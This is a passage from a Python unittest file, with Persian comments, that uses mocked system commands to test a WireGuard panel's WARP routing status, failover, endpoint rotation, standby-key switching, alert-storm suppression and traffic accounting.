                # مثلِ production: قواعدِ RETURNِ پورتِ ۵۳ (فازِ ۱) *قبل از*
                # MARK — رگرسیونِ «مبدأ ؟» دقیقاً چون mock این‌ها را نداشت
                # از تست‌ها رد شده بود؛ حالا این تست نگهبانِ همان است.
                return 0, ("-A PREROUTING -p tcp --dport 53 -m set "
                           "--match-set ai_warp dst -j RETURN\n"
                           "-A PREROUTING -p udp --dport 53 -m set "
                           "--match-set ai_warp dst -j RETURN\n"
                           "-A PREROUTING -s 192.168.0.0/16 -m set "
                           "--match-set ai_warp dst -j MARK --set-xmark 0x77\n"
                           "-A OUTPUT -p tcp --dport 53 -m set "
                           "--match-set ai_warp dst -j RETURN\n"
                           "-A OUTPUT -m set --match-set ai_warp dst -j MARK\n"
                           "-A OUTPUT -o wgwarp -p tcp -j TCPMSS "
                           "--set-mss 1200\n"), ""
            if c.startswith("iptables -t nat -S"):
                return 0, "-A POSTROUTING -o wgwarp -j MASQUERADE\n", ""
            if cmd[:2] == ["ip", "rule"]:
                return 0, "9:\tfrom all fwmark 0x77 lookup 230\n", ""
            if cmd[:3] == ["ip", "route", "show"]:
                return 0, "default dev wgwarp scope link\n", ""
            if cmd[:3] == ["ip", "route", "get"]:
                return 0, "162.159.192.1 dev wg22 src 10.12.46.198\n", ""
            if cmd[:2] == ["systemctl", "is-active"]:
                return 0, "active\n", ""
            if cmd[:2] == ["systemctl", "is-enabled"]:
                return 0, "enabled\n", ""
            return 0, "", ""
        m.run = fake_run
        m._unit_props = lambda u, p: {}
        d = m.warp_status(force=True)
        self.assertTrue(d["installed"])
        self.assertTrue(d["iface"]["up"])
        self.assertEqual(d["iface"]["endpoint"], "162.159.192.1:2408")
        self.assertEqual(d["iface"]["rx"], 5000)
        self.assertLess(d["iface"]["handshake_age"], 60)
        self.assertEqual(d["account"], "unlimited")
        self.assertEqual(d["nets"],
                         ["142.251.150.0/24", "216.239.32.0/24"])
        self.assertEqual(d["egress_actual"], "wg22")
        self.assertEqual(d["egress_want"], "wg22")
        r = d["rules"]
        self.assertTrue(r["mark_forward"] and r["mark_local"])
        self.assertEqual(r["forward_src"], "192.168.0.0/16")
        self.assertTrue(r["masquerade"] and r["ip_rule"] and r["table"])
        self.assertEqual(r["mss"], "1200")
        self.assertTrue(d["healthy"])
        # کش: فراخوانیِ دوم بدونِ force نباید دوباره دستور بزند
        calls = []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (0, "", ""))
        m.warp_status()
        self.assertEqual(calls, [])

    def test_unhealthy_when_a_piece_missing(self):
        """اگر یکی از اجزا (مثلاً NAT) نباشد، healthy=False شود."""
        m = self.m
        self._write_sync()
        m._WARP_CACHE.update(ts=0, data=None)
        m.live_interfaces = lambda: ["wgwarp"]
        m.tunnel_rx_rate = lambda i: 0
        m._unit_props = lambda u, p: {}

        def fake_run(cmd, timeout=20):
            c = " ".join(cmd)
            if cmd[0] == "ipset":
                return 0, "add ai_warp 142.251.150.0/24\n", ""
            if c.startswith("iptables -t nat -S"):
                return 0, "", ""          # NAT غایب
            if c.startswith("iptables -t mangle -S"):
                return 0, ("-A PREROUTING -s 192.168.0.0/16 -m set "
                           "--match-set ai_warp dst -j MARK\n"), ""
            return 0, "", ""
        m.run = fake_run
        d = m.warp_status(force=True)
        self.assertFalse(d["rules"]["masquerade"])
        self.assertFalse(d["healthy"])


class WarpGuardTests(unittest.TestCase):
    """تاب‌آوریِ WARP: failoverِ egress + graceful degradation."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.WARP_SYNC = os.path.join(self.tmp, "sync.sh")
        open(self.m.WARP_SYNC, "w").close()
        self.m.WARP_GUARD_STATE = os.path.join(self.tmp, "guard.state")
        self.m.WARP_GUARD_HEARTBEAT = os.path.join(self.tmp, "guard.hb")
        self.m.CONFIG["warp_guard"] = {"enabled": True, "primary": "wg22",
                                       "backup": "wg21", "degrade_after": 3}
        self.m.ALERTS.event = lambda *a, **k: None
        # probeِ لایه‌ی داده در تست شبکه ندارد؛ سلامت از همان hs/rxِ ساختگی
        # آزمون خوانده شود نه از pingِ واقعی.
        self.m.tunnel_data_plane_ok = lambda *a, **k: True

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_egress_failover(self):
        """اگر primary مرد و backup سالم بود، endpoint سوییچ می‌کند."""
        m = self.m
        g = m.WarpGuard()
        calls = []
        # وضعیت: wg22 پایین، wg21 بالا، wgwarp بالا با هندشیک تازه
        m.live_interfaces = lambda: ["wg21", "wgwarp"]
        m.tunnel_handshake_age = lambda i: 20
        m.warp_egress_actual = lambda ep=None: "awg1"     # الان اشتباه via awg1
        m.warp_rule_present = lambda: True

        def fake_run(cmd, timeout=20):
            calls.append(cmd)
            return 0, "", ""
        m.run = fake_run
        g.reconcile()
        # باید route را به wg21 (backup) عوض کند
        self.assertTrue(any(c[:3] == ["ip", "route", "replace"]
                            and "wg21" in c for c in calls))
        # state فایل egress=wg21 دارد
        st = pathlib.Path(m.WARP_GUARD_STATE).read_text()
        self.assertIn("egress=wg21", st)
        self.assertIn("rule=on", st)

    def test_pin_follows_live_endpoint(self):
        """پین باید روی endpointِ زنده بنشیند نه ثابتِ WARP_EP_IP — روم
        (autodetect/چرخش) endpoint را عوض می‌کند و پینِ ثابتِ کهنه یعنی
        endpointِ واقعی از awg1 برود در حالی که state ادعای سلامت دارد."""
        m = self.m
        g = m.WarpGuard()
        calls = []
        seen = {}
        m.live_interfaces = lambda: ["wg22", "wgwarp"]
        m.tunnel_handshake_age = lambda i: 20

        def spy_egress(ep=None):
            seen["ep"] = ep
            return "awg1"                       # مسیرِ فعلی: غلط
        m.warp_egress_actual = spy_egress
        m.warp_rule_present = lambda: True

        def fake_run(cmd, timeout=20):
            calls.append(cmd)
            if cmd[0] == "wg" and "endpoints" in cmd:
                return 0, "pub\t188.114.97.1:2408\n", ""
            return 0, "", ""
        m.run = fake_run
        g.reconcile()
        # سنجش و پین هر دو روی endpointِ زنده، نه WARP_EP_IP
        self.assertEqual(seen["ep"], "188.114.97.1")
        self.assertTrue(any(c[:3] == ["ip", "route", "replace"]
                            and c[3] == "188.114.97.1/32" and "wg22" in c
                            for c in calls))
        self.assertNotIn(m.WARP_EP_IP + "/32",
                         [c[3] for c in calls if len(c) > 3])
        # state هم endpointِ زنده را اعلام می‌کند (مصرفِ sync.sh)
        self.assertIn("endpoint=188.114.97.1",
                      pathlib.Path(m.WARP_GUARD_STATE).read_text())

    def test_graceful_degradation_and_recovery(self):
        """wgwarp مرده چند چرخه → قاعده برداشته شود؛ سالم شد → برگردد."""
        m = self.m
        g = m.WarpGuard()
        m.warp_egress_actual = lambda ep=None: "wg22"
        deleted = {"n": 0}
        added = {"n": 0}

        def fake_run(cmd, timeout=20):
            if cmd[:3] == ["ip", "rule", "del"]:
                deleted["n"] += 1
            if cmd[:3] == ["ip", "rule", "add"]:
                added["n"] += 1
            return 0, "", ""
        m.run = fake_run
        # wgwarp مرده (پایین)
        m.live_interfaces = lambda: ["wg22"]
        m.tunnel_handshake_age = lambda i: None
        present = {"v": True}
        m.warp_rule_present = lambda: present["v"]
        # degrade_after=3: دو چرخه هنوز نه
        g.reconcile(); g.reconcile()
        self.assertEqual(deleted["n"], 0)
        self.assertFalse(g.degraded)
        # چرخهٔ سوم → حذفِ قاعده (fail-open)
        def del_run(cmd, timeout=20):
            if cmd[:4] == ["ip", "rule", "del", "fwmark"]:
                present["v"] = False; deleted["n"] += 1
            return 0, "", ""
        m.run = del_run
        g.reconcile()
        self.assertTrue(g.degraded)
        self.assertGreaterEqual(deleted["n"], 1)
        self.assertIn("rule=off", pathlib.Path(m.WARP_GUARD_STATE).read_text())
        # wgwarp سالم شد → قاعده برمی‌گردد
        m.live_interfaces = lambda: ["wg22", "wgwarp"]
        m.tunnel_handshake_age = lambda i: 10
        m.run = fake_run
        g.reconcile()
        self.assertFalse(g.degraded)
        self.assertGreaterEqual(added["n"], 1)

    def test_disabled_does_nothing(self):
        m = self.m
        m.CONFIG["warp_guard"] = {"enabled": False}
        g = m.WarpGuard()
        calls = []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (0, "", ""))
        m.live_interfaces = lambda: []
        g.reconcile()
        self.assertEqual(calls, [])

    def test_guard_state_reader(self):
        m = self.m
        with open(m.WARP_GUARD_HEARTBEAT, "w") as f:
            f.write("%d\n" % int(time.time()))
        with open(m.WARP_GUARD_STATE, "w") as f:
            f.write("egress=wg21\nrule=off\n")
        st = m.warp_guard_state()
        self.assertTrue(st["alive"])
        self.assertEqual(st["egress"], "wg21")
        self.assertEqual(st["rule"], "off")

    def test_not_installed_gate(self):
        """اگر sync.sh وجود ندارد (WARP نصب نیست)، گارد باید *هیچ* کاری
        نکند — نه heartbeat بنویسد نه route دستکاری کند. نسخه‌ی قبلیِ این
        گیت کدِ مرده بود (شرطِ همیشه-False + بدنه‌ی pass)."""
        m = self.m
        os.remove(m.WARP_SYNC)
        g = m.WarpGuard()
        calls = []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (0, "", ""))
        m.live_interfaces = lambda: ["wg22", "wgwarp"]
        m.tunnel_handshake_age = lambda i: 10
        g.reconcile()
        self.assertEqual(calls, [])
        self.assertFalse(os.path.exists(m.WARP_GUARD_HEARTBEAT))

    def test_iface_down_still_reconciles(self):
        """پایین‌بودنِ موقتِ wgwarp نباید گارد را خاموش کند — دقیقاً همان
        حالتی است که degradation باید در آن کار کند."""
        m = self.m
        g = m.WarpGuard()
        m.run = lambda cmd, timeout=20: (0, "", "")
        m.live_interfaces = lambda: ["wg22"]        # wgwarp غایب
        m.tunnel_handshake_age = lambda i: None
        m.warp_egress_actual = lambda ep=None: "wg22"
        m.warp_rule_present = lambda: True
        g.reconcile()
        self.assertTrue(os.path.exists(m.WARP_GUARD_HEARTBEAT))
        self.assertEqual(g.dead_streak, 1)


class WarpRotationTests(unittest.TestCase):
    """چرخشِ endpointِ WARP + سوییچِ استندبای در WarpGuard."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.WARP_SYNC = os.path.join(self.tmp, "sync.sh")
        open(self.m.WARP_SYNC, "w").close()
        self.m.WARP_GUARD_STATE = os.path.join(self.tmp, "guard.state")
        self.m.WARP_GUARD_HEARTBEAT = os.path.join(self.tmp, "guard.hb")
        self.m.WARP_STANDBY_KEY = os.path.join(self.tmp, "standby.key")
        self.m.WARP_ACCOUNT_FILE = os.path.join(self.tmp, "account")
        self.m.CONFIG["warp_guard"] = {"enabled": True, "primary": "wg22",
                                       "backup": "wg21", "degrade_after": 99,
                                       "rotate": True, "rotate_after": 3}
        # probeِ لایه‌ی داده در تست شبکه ندارد؛ سناریوی چرخش باید از hs/rxِ
        # ساختگیِ آزمون هدایت شود نه از pingِ واقعی.
        self.m.tunnel_data_plane_ok = lambda *a, **k: True
        self.m.ALERTS.event = lambda *a, **k: None
        self.calls = []
        # کلیدِ خصوصیِ «داخلِ کرنل». تشخیصِ استندبای از همین خوانده می‌شود،
        # پس آزمون باید اثرِ `wg set private-key` را واقعاً مدل کند وگرنه
        # حلقه‌ی بازخوردی که رگرسیون را می‌گیرد بسته نمی‌شود.
        self.iface_key = "PRIMARY"

        def fake_run(cmd, timeout=20):
            self.calls.append(cmd)
            if cmd[:3] == ["wg", "show", "wgwarp"] and "peers" in cmd:
                return 0, "PUBKEY=\n", ""
            if cmd[:3] == ["wg", "show", "wgwarp"] and "endpoints" in cmd:
                return 0, "PUBKEY=\t162.159.192.1:2408\n", ""
            if cmd[:3] == ["wg", "show", "wgwarp"] and "private-key" in cmd:
                return 0, self.iface_key + "\n", ""
            if cmd[:2] == ["wg", "set"] and "private-key" in cmd:
                try:
                    with open(cmd[cmd.index("private-key") + 1]) as f:
                        self.iface_key = f.read().strip()
                except OSError:
                    return 1, "", "no key file"
                return 0, "", ""
            return 0, "", ""
        self.m.run = fake_run
        # wgwarp «بالا» ولی بی‌هندشیک (سناریوی چرخش)
        self.m.live_interfaces = lambda: ["wg22", "wgwarp"]
        self.m.tunnel_handshake_age = lambda i: None
        self.m.warp_egress_actual = lambda ep=None: "wg22"
        self.m.warp_rule_present = lambda: True

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _rotations(self):
        return [c for c in self.calls
                if c[:2] == ["wg", "set"] and "endpoint" in c]

    def _key_sets(self):
        """فقط *نوشتنِ* کلید — نه خواندنِ آن برای تشخیص."""
        return [c for c in self.calls
                if c[:2] == ["wg", "set"] and "private-key" in c]

    def test_rotates_after_threshold_with_pin_first(self):
        m = self.m
        g = m.WarpGuard()
        g.reconcile()
        g.reconcile()                     # streak=1,2 — هنوز چرخش نه
        self.assertEqual(self._rotations(), [])
        g.reconcile()                     # streak=3 == rotate_after → چرخش
        rots = self._rotations()
        self.assertEqual(len(rots), 1)
        ep = m.WARP_EP_POOL[1]            # از primary به عضوِ بعدی
        self.assertIn(ep + ":2408", rots[0])
        # ترتیبِ حیاتی: pinِ مسیرِ endpointِ جدید باید *قبل از* wg set باشد
        pin_i = next(i for i, c in enumerate(self.calls)
                     if c[:3] == ["ip", "route", "replace"]
                     and c[3] == ep + "/32")
        set_i = self.calls.index(rots[0])
        self.assertLess(pin_i, set_i)
        # state باید endpointِ جدید را داشته باشد (برای pinِ sync.sh)
        self.assertIn("endpoint=" + ep,
                      pathlib.Path(m.WARP_GUARD_STATE).read_text())
        # streak=4: چرخشِ جدید نه (هر ۲ چرخه یکی)؛ streak=5: بعدی
        g.reconcile()
        self.assertEqual(len(self._rotations()), 1)
        g.reconcile()
        self.assertEqual(len(self._rotations()), 2)
        self.assertIn(m.WARP_EP_POOL[2] + ":2408", self._rotations()[1])

    def test_healthy_resets_and_no_rotation(self):
        m = self.m
        m.tunnel_handshake_age = lambda i: 10
        g = m.WarpGuard()
        for _ in range(6):
            g.reconcile()
        self.assertEqual(self._rotations(), [])
        self.assertEqual(g.rot_count, 0)

    def test_standby_after_full_pool_only_with_keyfile(self):
        m = self.m
        g = m.WarpGuard()
        # بدونِ فایلِ کلید: حتی بعد از دورِ کاملِ استخر سوییچ نمی‌کند
        for _ in range(3 + 2 * (len(m.WARP_EP_POOL) + 2)):
            g.reconcile()
        self.assertFalse(g._on_standby())
        # بدونِ فایلِ کلید حتی probe هم زده نمی‌شود (گاردِ isfile اول است)
        self.assertFalse(any("private-key" in c for c in self.calls))
        # با فایلِ کلید: بعد از دورِ کامل سوییچ می‌کند (یک‌بار)
        with open(m.WARP_STANDBY_KEY, "w") as f:
            f.write("KEY\n")
        g2 = m.WarpGuard()
        self.calls.clear()
        for _ in range(3 + 2 * (len(m.WARP_EP_POOL) + 2)):
            g2.reconcile()
        self.assertTrue(g2._on_standby())
        sw = self._key_sets()
        self.assertEqual(len(sw), 1)
        self.assertIn(m.WARP_STANDBY_KEY, sw[0])
        self.assertEqual(pathlib.Path(m.WARP_ACCOUNT_FILE).read_text().strip(),
                         "standby")

    # ---- خانواده‌ی باگ: «وضعیتی که باید آینه‌ی واقعیت باشد، در حافظه
    # نگه داشته شود و با تغییرِ بیرونیِ واقعیت کهنه بماند.» هر دو جهت.

    def test_external_key_restore_rearms_standby(self):
        """رگرسیونِ ۱۴ اوت ۲۰۲۶: پس از بازگرداندنِ کلیدِ اصلی از بیرون —
        همان `systemctl restart wg-quick@wgwarp` که خودِ متنِ هشدار
        پیشنهاد می‌دهد — تورِ استندبای باید دوباره مسلح شود. با فلگِ
        حافظه‌ای، قطعیِ بعدی بی‌صدا بدونِ استندبای می‌ماند."""
        m = self.m
        with open(m.WARP_STANDBY_KEY, "w") as f:
            f.write("KEY\n")
        rounds = 3 + 2 * (len(m.WARP_EP_POOL) + 2)
        g = m.WarpGuard()
        for _ in range(rounds):
            g.reconcile()
        self.assertEqual(len(self._key_sets()), 1)
        self.assertTrue(g._on_standby())
        # بازگردانیِ بیرونی: کرنل کلیدِ اصلی را دارد ولی همین شیءِ گارد
        # زنده است — پنل ری‌استارت نشده.
        self.iface_key = "PRIMARY"
        self.assertFalse(g._on_standby())
        for _ in range(rounds):
            g.reconcile()
        self.assertEqual(len(self._key_sets()), 2)

    def test_fresh_guard_reads_standby_from_kernel(self):
        """جهتِ عکسِ همان خانواده: اگر پنل ری‌استارت شود در حالی که
        اینترفیس از پیش روی کلیدِ استندبای است، گاردِ تازه — که حافظه‌اش
        صفر است — نباید دوباره سوییچ کند."""
        m = self.m
        with open(m.WARP_STANDBY_KEY, "w") as f:
            f.write("KEY\n")
        self.iface_key = "KEY"           # از پیش روی استندبای
        g = m.WarpGuard()                # حافظه‌ی خالی
        for _ in range(3 + 2 * (len(m.WARP_EP_POOL) + 2)):
            g.reconcile()
        self.assertEqual(self._key_sets(), [])


class WarpAccountMarkerTests(unittest.TestCase):
    """رگرسیونِ ۱۴ اوت ۲۰۲۶ — نشانگرِ `standby` نباید با نوعِ حسابِ اصلی
    بازنویسی شود.

    خانواده‌ی باگ: «نویسنده‌ای که وضعیت را از منبعی می‌خواند که تغییرِ واقعی
    را نمی‌بیند.» `wgcf status` همیشه حسابِ *اصلی* را گزارش می‌کند، حتی وقتی
    WarpGuard اینترفیس را روی کلیدِ استندبای برده؛ نوشتنِ بی‌قیدِ آن یعنی
    پایش `unlimited` می‌گوید در حالی که سرور روی حسابِ free و throttle است —
    خرابی به‌جای دیده‌شدن، پنهان می‌شود.

    تستِ رفتاری ممکن نیست (sync.sh به root و iptables نیاز دارد)، پس مثلِ
    بقیه‌ی گاردهای ایستای این مخزن ساختار را می‌سنجیم — روی کدِ بدونِ کامنت،
    تا بازنویسیِ متنِ توضیحات تست را نشکند.

    در شاخه‌ی public اسکریپت‌های عملیاتیِ `deploy/` وارد نمی‌شوند، پس آنجا
    کلِ کلاس skip می‌شود — مثلِ AnsibleSyncTests. اینجا هرگز skip نمی‌شود."""

    @classmethod
    def setUpClass(cls):
        p = os.path.join(HERE, "..", "deploy", "warp-gemini-sync.sh")
        if not os.path.isfile(p):
            raise unittest.SkipTest("deploy/ نیست — مخزنِ عمومی")
        with open(p, encoding="utf-8") as f:
            cls.src = f.read()
        cls.code = "\n".join(l for l in cls.src.splitlines()
                             if not l.lstrip().startswith("#"))

    def test_standby_detection_precedes_account_write(self):
        self.assertIn("warp-standby.key", self.code,
                      "sync.sh باید وجودِ کلیدِ استندبای را بررسی کند")
        self.assertLess(self.code.index("warp-standby.key"),
                        self.code.index("wgcf status"),
                        "تشخیصِ استندبای باید *پیش از* نوشتنِ نوعِ حسابِ اصلی باشد")

    def test_standby_marker_is_written(self):
        self.assertRegex(
            self.code,
            r"echo\s+standby\s*>\s*/opt/wg-panel/warp-account")

    def test_compares_public_keys_not_private(self):
        """مقایسه باید با کلیدِ عمومی باشد؛ کلیدِ خصوصی نباید واردِ متغیرِ
        شل (و از آنجا لاگ یا `set -x`) شود."""
        self.assertIn("wg pubkey <", self.code)
        self.assertNotRegex(self.code, r"\$\(\s*cat\s+\S*warp-standby\.key")


class FlapGateTests(unittest.TestCase):
    """ضدِ رگبارِ هشدارِ قطع/وصل — رگرسیونِ طوفانِ ~۳۶۰ پیامیِ ۲۰۲۶-۰۷-۲۱."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_isolated_transitions_pass_through(self):
        """گذرهای پراکنده (خارجِ پنجره) همیشه عادی می‌رسند."""
        g = self.m.FlapGate()
        for t in (0, 700, 1400, 2100):
            self.assertEqual(g.flip(now=t), "send")
            self.assertIsNone(g.poll(now=t + 1))

    def test_storm_detected_muted_then_summarised(self):
        g = self.m.FlapGate()
        self.assertEqual(g.flip(now=0), "send")
        self.assertEqual(g.flip(now=45), "send")
        # سومین گذرِ نزدیک‌به‌هم = ورود به طوفان (اعلانِ یک‌باره)
        self.assertEqual(g.flip(now=90), "storm")
        # در دلِ طوفان: سکوتِ مطلق
        for t in (135, 180, 225, 270):
            self.assertIsNone(g.flip(now=t))
        # تا وقتی گذرِ تازه هست، جمع‌بندی نه
        self.assertIsNone(g.poll(now=270 + 300))
        # QUIET ثانیه بی‌گذر → جمع‌بندی با شمارِ ساکت‌شده‌ها، فقط یک‌بار
        self.assertEqual(g.poll(now=270 + 600), 4)
        self.assertIsNone(g.poll(now=270 + 601))
        # بعدِ آرامش، گذرِ تازه دوباره عادی است
        self.assertEqual(g.flip(now=2000), "send")

    def test_requires_burst_within_window(self):
        """دو گذرِ کهنه + یکیِ تازه طوفان نیست (پنجره لغزان است)."""
        g = self.m.FlapGate()
        g.flip(now=0)
        g.flip(now=30)
        self.assertEqual(g.flip(now=700), "send")


class WarpSniFlapStormTests(unittest.TestCase):
    """رفتارِ سرتاسری: flapِ سلامتِ splitter در reconcile فقط چند پیامِ
    محدود بدهد نه یکی per گذر (سناریوی واقعیِ اشباعِ fd، ۲۰۲۶-۰۷-۲۱)."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        m = self.m
        m.WARP_SYNC = os.path.join(self.tmp, "sync.sh")
        open(m.WARP_SYNC, "w").close()
        m.WARP_GUARD_STATE = os.path.join(self.tmp, "guard.state")
        m.WARP_GUARD_HEARTBEAT = os.path.join(self.tmp, "guard.hb")
        m.CONFIG["warp_guard"] = {"enabled": True, "primary": "wg22",
                                  "backup": "wg21", "degrade_after": 99}
        # wgwarp کاملاً سالم تا فقط بخشِ SNI فعال باشد
        m.live_interfaces = lambda: ["wg22", "wgwarp"]
        m.tunnel_handshake_age = lambda i: 20
        m.tunnel_rx_rate = lambda i: 1.0
        m.tunnel_data_plane_ok = lambda *a, **k: True
        m.warp_egress_actual = lambda ep=None: "wg22"
        m.warp_rule_present = lambda: True
        m.run = lambda cmd, timeout=20: (0, "", "")
        # جراحیِ SNI روشن، QUIC خاموش؛ اعمالِ iptables ماک
        m.warp_sni_enabled = lambda: True
        m.warp_sni_quic_enabled = lambda: False
        m.warp_sni_set_tproxy = lambda ok: True
        self.health = [True]
        m.warp_sni_healthy = lambda: self.health[0]
        self.sent = []
        m.ALERTS.event = lambda key, text: self.sent.append(text)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_storm_sends_bounded_messages_and_summary(self):
        m = self.m
        g = m.WarpGuard()
        g.reconcile()                        # سالم؛ ثبتِ وضعِ اولیه، بی‌پیام
        self.assertEqual(self.sent, [])
        # ۸ گذرِ پشتِ‌سرِهم (قطع/وصل × ۴) — مثلِ flapِ واقعی
        for _ in range(8):
            self.health[0] = not self.health[0]
            g.reconcile()
        # فقط ۳ پیام: قطع، وصل، «ناپایدار شد» — بقیه ساکت
        self.assertEqual(len(self.sent), 3)
        self.assertIn("از کار افتاد", self.sent[0])
        self.assertIn("دوباره کار می‌کند", self.sent[1])
        self.assertIn("ناپایدار", self.sent[2])
        # آرامش: گذرها را کهنه کن → چرخه‌ی بعد جمع‌بندی بدهد
        g.sni_gate.flips = [t - (g.sni_gate.QUIET + 1)
                            for t in g.sni_gate.flips]
        g.reconcile()                        # بدونِ گذرِ تازه
        self.assertEqual(len(self.sent), 4)
        self.assertIn("پایدار شد", self.sent[3])
        # ۸ گذر بود: ۳تای اول پیام داشتند، ۵تا ساکت → جمعِ گزارش‌شده = ۸
        self.assertIn(m._fa_num(8), self.sent[3])
        # پس از جمع‌بندی، سکوت پایدار است
        g.reconcile()
        self.assertEqual(len(self.sent), 4)


class WarpSyncAgeTests(unittest.TestCase):
    """مهرِ آخرین اجرای موفقِ sync — پایه‌ی هشدارِ «حلقه‌ی خرابیِ خاموش»."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.WARP_LAST_SYNC = os.path.join(self.tmp, "warp-last-sync")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_missing_file(self):
        self.assertIsNone(self.m.warp_sync_age())

    def test_fresh_stamp(self):
        with open(self.m.WARP_LAST_SYNC, "w") as f:
            f.write("%d\n" % int(time.time() - 120))
        age = self.m.warp_sync_age()
        self.assertIsNotNone(age)
        self.assertTrue(100 <= age <= 200, "age=%r" % age)

    def test_stale_stamp(self):
        with open(self.m.WARP_LAST_SYNC, "w") as f:
            f.write("%d\n" % int(time.time() - 4000))
        self.assertGreater(self.m.warp_sync_age(), 2700)

    def test_garbage_stamp(self):
        with open(self.m.WARP_LAST_SYNC, "w") as f:
            f.write("junk\n")
        self.assertIsNone(self.m.warp_sync_age())


class WarpProbeTests(unittest.TestCase):
    """probeِ سطحِ اپلیکیشن: پارسِ cdn-cgi/trace + کدِ gemini."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_probe_parses_trace_and_code(self):
        m = self.m

        def fake_run(cmd, timeout=20):
            if "cdn-cgi/trace" in " ".join(cmd):
                return 0, ("fl=1\nip=104.28.218.100\nloc=HU\ncolo=BUD\n"
                           "warp=plus\n"), ""
            # curlِ TTFB: قالبِ «time_starttransfer http_code»
            return 0, "0.421 200", ""
        m.run = fake_run
        p = m.warp_probe_run()
        self.assertEqual(p["trace"]["loc"], "HU")
        self.assertEqual(p["trace"]["colo"], "BUD")
        self.assertEqual(p["trace"]["warp"], "plus")
        self.assertEqual(p["trace"]["ip"], "104.28.218.100")
        self.assertNotIn("fl", p["trace"])       # کلیدهای نامربوط نیایند
        self.assertEqual(p["gemini"], "200")
        self.assertEqual(p["warp_ttfb"], 421)    # TTFB هم استخراج شود
        self.assertGreater(p["ts"], 0)

    def test_probe_network_failure(self):
        m = self.m
        m.run = lambda cmd, timeout=20: (7, "", "connect fail")
        p = m.warp_probe_run()
        self.assertEqual(p["trace"], {})
        self.assertEqual(p["gemini"], "")
        self.assertIsNone(p["warp_ttfb"])
        self.assertIsNone(p["direct_ttfb"])

    def test_probe_binds_wgwarp_but_direct_baseline_does_not(self):
        """trace و TTFBِ WARP باید با --interface wgwarp بروند (datapathِ خودِ
        تونل)؛ ولی خطِ مبنای «مسیرِ عادی» عمداً بدونِ interface است."""
        m = self.m
        seen = []
        m.run = lambda cmd, timeout=20: (seen.append(cmd) or (0, "0.1 200", ""))
        m.warp_probe_run()
        warp_cmds = [c for c in seen if "--interface" in c]
        direct_cmds = [c for c in seen if "--interface" not in c]
        # trace + gemini/WARP-TTFB با interface
        self.assertGreaterEqual(len(warp_cmds), 2)
        for cmd in warp_cmds:
            self.assertIn(m.WARP_IFACE, cmd)
        # دقیقاً یک اندازه‌گیریِ مسیرِ عادی (بدونِ interface)
        self.assertEqual(len(direct_cmds), 1)


class WarpTrafficTests(unittest.TestCase):
    """حسابداریِ per-block از شمارنده‌های ipset: پارس + تجمیع با ریست."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_parse_counters(self):
        txt = ("Name: ai_warp\nType: hash:net\n"
               "Header: family inet hashsize 1024 maxelem 65536 counters\n"
               "Members:\n"
               "142.251.150.0/24 packets 120 bytes 45000\n"
               "216.239.32.0/24 packets 0 bytes 0\n"
               "1.2.3.4 packets 5 bytes 500\n")
        p = self.m._parse_ipset_counters(txt)
        self.assertEqual(p["142.251.150.0/24"], (120, 45000))
        self.assertEqual(p["216.239.32.0/24"], (0, 0))
        self.assertEqual(p["1.2.3.4"], (5, 500))
        self.assertEqual(len(p), 3)

    def test_merge_accumulates_and_survives_reset(self):
        """swapِ هر sync شمارنده‌ی کرنل را صفر می‌کند؛ تجمیع نباید بپرد:
        جدید < قبلی یعنی ریست → کلِ مقدارِ جدید delta است."""
        m = self.m
        nets = {}
        m._warp_traffic_merge(nets, {"a": (10, 1000)})
        m._warp_traffic_merge(nets, {"a": (15, 1600)})    # +5 / +600
        self.assertEqual(nets["a"]["bytes"], 1600)
        self.assertEqual(nets["a"]["pkts"], 15)
        m._warp_traffic_merge(nets, {"a": (2, 300)})      # ریست (swap)
        self.assertEqual(nets["a"]["bytes"], 1900)
        self.assertEqual(nets["a"]["pkts"], 17)

    def test_merge_keeps_missing_entry(self):
        """عضوِ حذف‌شده از ست، تجمعش حفظ و last صفر می‌شود تا بازگشتِ
        بعدی از صفر درست شمرده شود."""
        m = self.m
        nets = {}
        m._warp_traffic_merge(nets, {"a": (10, 1000), "b": (1, 100)})
        m._warp_traffic_merge(nets, {"a": (12, 1200)})    # b غایب
        self.assertEqual(nets["b"]["bytes"], 100)
        self.assertEqual(nets["b"]["last_b"], 0)
        m._warp_traffic_merge(nets, {"a": (13, 1300), "b": (3, 50)})
        self.assertEqual(nets["b"]["bytes"], 150)         # +۵۰ نه +(50-100)

    def test_snapshot_sorts_and_maps_domains(self):
        m = self.m
        m.WARP_CACHE_DIR = os.path.join(self.tmp, "cache")
        os.makedirs(m.WARP_CACHE_DIR)
        with open(os.path.join(m.WARP_CACHE_DIR, "gemini.google.com"),
                  "w") as f:
            f.write("1700000000\n142.251.150.0/24\n")
        with m._WARP_TRAFFIC_LOCK:
            m._WARP_TRAFFIC["since"] = 1700000000
            m._WARP_TRAFFIC["nets"] = {
                "142.251.150.0/24": {"bytes": 500, "pkts": 5,
                                     "last_b": 0, "last_p": 0},
                "216.239.32.0/24": {"bytes": 9000, "pkts": 90,
                                    "last_b": 0, "last_p": 0}}
        snap = m.warp_traffic_snapshot()
        self.assertEqual(snap["total_bytes"], 9500)
